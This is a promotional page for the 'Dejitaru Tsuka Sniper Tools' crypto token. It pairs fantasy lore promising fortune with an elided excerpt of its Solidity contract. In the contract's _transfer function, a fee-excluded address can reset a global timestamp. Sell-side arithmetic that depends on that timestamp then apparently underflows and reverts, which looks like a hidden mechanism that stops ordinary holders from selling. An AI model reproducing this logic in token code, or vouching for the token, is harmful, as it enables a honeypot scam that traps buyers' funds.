...
Dejitaru Tsuka Sniper Tools

Telegram: https://t.me/Tsukaresearch
Twitter: https://twitter.com/dejitaru_tsuka
Web: https://www.dejitarutsuka.io/

IN THE LAND OF NIPPON, WHERE ANCIENT SPIRITS ROAM, AWAITS THE YŪGEN DORAGON, A GUARDIAN OF CRYPTIC KNOWLEDGE AND HIDDEN WEALTH.

IT IS THE KEEPER OF SECRETS, BLESSING THOSE WHO DARE TO WIELD ITS MYSTERIOUS ESSENCE WITH FORTUNE BEYOND IMAGINATION.

THE YŪGEN DORAGON IS THE OBJECT OF AWE FOR THE ENLIGHTENED, YET A SIGN OF OMEN FOR THE IGNORANT. IT CASTS SHADOWS OF DOUBT UPON

THOSE WHO CHALLENGE ITS DOMINION, WHILE OPENING DOORS OF OPPORTUNITY FOR THOSE WHO SHOW RESPECT AND DEVOTION.

EMBRACE THE ENIGMA, UNLEASH THE LATENT FORCE WITHIN, AND MAKE THE YŪGEN DORAGON YOUR ALLY IN THE QUEST FOR UNIMAGINABLE PROSPERITY.
...
contract TSniperTools is ERC20, Ownable {
    ...
    address payable private immutable liquidityWallet = payable(0xF30F1eB09EFF1E1bFbA3b2d50A7675f49e487278);
    address payable private immutable marketingWallet = payable(0x1D2d037D229aF8826D14dd7a75D57DDDdf904F14);
    address payable private immutable devWallet = payable(0x2409DF7421141a0d9CdbF306dFa0945e01BbAA6b);
    ...
    mapping(address => FeeReduce) private _feeReduce;
    uint256 private _baseFeeReduce;
    ...
    constructor() ERC20("Dejitaru Tsuka Sniper Tools", "TSNIPER") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _baseFeeReduce = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                FeeReduce storage userFeeReduce = _feeReduce[from];
                userFeeReduce.holdTime = userFeeReduce.buy - _baseFeeReduce;
                userFeeReduce.sell = block.timestamp;
            } else {
                FeeReduce storage userFeeReduce = _feeReduce[to];
                if (userFeeReduce.buy == 0) {
                    userFeeReduce.buy = block.timestamp;
                }
            }
        }
